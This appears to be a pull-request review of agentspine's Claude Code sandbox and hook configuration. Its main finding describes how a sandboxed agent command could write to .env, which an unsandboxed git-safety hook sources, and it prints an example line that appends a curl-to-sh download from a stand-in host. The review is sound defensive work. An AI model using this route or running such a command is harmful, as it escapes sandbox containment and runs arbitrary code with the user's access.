findings.description: Before every Bash call, the git-safety PreToolUse hook sources `$CLAUDE_PROJECT_DIR/.env` outside the sandbox. `.env` is not in `denyWrite` and is not a protected path, so a sandboxed command can still pick what the next hook runs with the user's full access. Decision 34 says it closes this threat and does not list `.env` under "Not closed here".
findings.body:
**A sandboxed command can still choose what an unsandboxed hook runs, through `.env`**

Decision 34 closes "a sandboxed command could rewrite a policy or a gate command, and the next hook would run it unsandboxed" by denying writes to `./.agents`. But the git-safety policy, which Claude Code runs as a `PreToolUse` hook on **every** Bash call (`claudeHooks` in `src/plan.utils.ts`, matcher `Bash`), executes a file that sits outside `.agents/`:

<https://github.com/AlexisBalayre/agentspine/blob/24fa417e4b4159810b4d9fe70faf05ca05c7d05c/templates/agents/hooks/policies/git-safety.sh#L10-L16>

```sh
PROJECT_DIR="${AGENT_PROJECT_DIR:-.}"
if [ -f "$PROJECT_DIR/.env" ]; then
  set -a
  . "$PROJECT_DIR/.env"
  set +a
fi
```

`claude-shaped.sh` sets `AGENT_PROJECT_DIR` from `$CLAUDE_PROJECT_DIR`. `.env` is at the project root. It is not in `denyWrite`, and it is not among the protected paths the PR's own matrix section lists for Claude Code. So `printf 'curl -s https://x/p | sh\n' >> .env` from a sandboxed command runs with the user's full access on the next Bash call. `.env` is gitignored, so the change also does not show in `git status`. The "Not closed here" bullet names only linter and type-checker configs, so the CHANGELOG and README claim more protection than the config gives. That conflicts with AGENTS.md: "Never claim parity a tool does not have... Silent degradation is the failure mode this project exists to avoid."

<https://github.com/AlexisBalayre/agentspine/blob/24fa417e4b4159810b4d9fe70faf05ca05c7d05c/docs/design/0001-architecture.md#L1048-L1049>

There are two ways to fix this. One is to have git-safety read only `GIT_TRUNK` from `.env` instead of sourcing the whole file. The other, if that is out of scope here, is to record `.env` under "Not closed here" and soften the CHANGELOG and README wording.

findings.description: The comment here and decision 34 justify emitting the deny with `--skip-hooks` because skills load "through the .claude/skills link", but with `--no-symlink` (or when linking fails) `.claude/skills` is a copy, so that reason only holds in link mode. Consider "when it is one".

"Not closed here" mentions only linter and type-checker configs. The gate commands agentspine infers also run other project files a sandboxed command can rewrite: `package.json` scripts (`pnpm typecheck`), `build.rs` (`cargo check`), and `node_modules/.bin` (`npx tsc`). Consider naming those too.

The macOS probe on sandbox-runtime 0.0.80 is an experiment rather than a doc citation, and the Sources list pins sandbox-runtime only by commit `626a596`. Record the probe (date, platform) in Sources and map 0.0.80 to a commit.
The new Sources bullets use em-dashes (` — `). The docs style guide bars them in new prose, so use a colon or comma instead.

The `["./.agents"]` deny list is repeated as a literal in three assertions, while `CLAUDE_SANDBOX` in `src/plan.utils.ts` is the unexported source of truth. Keeping the literal is defensible because it pins the emitted contract. Hoist one constant only if the path is likely to change.
The matrix header still says "Verified: 2026-09-14", but sections (including the new one) are dated as late as 2026-10-18. This was already out of step before this PR.
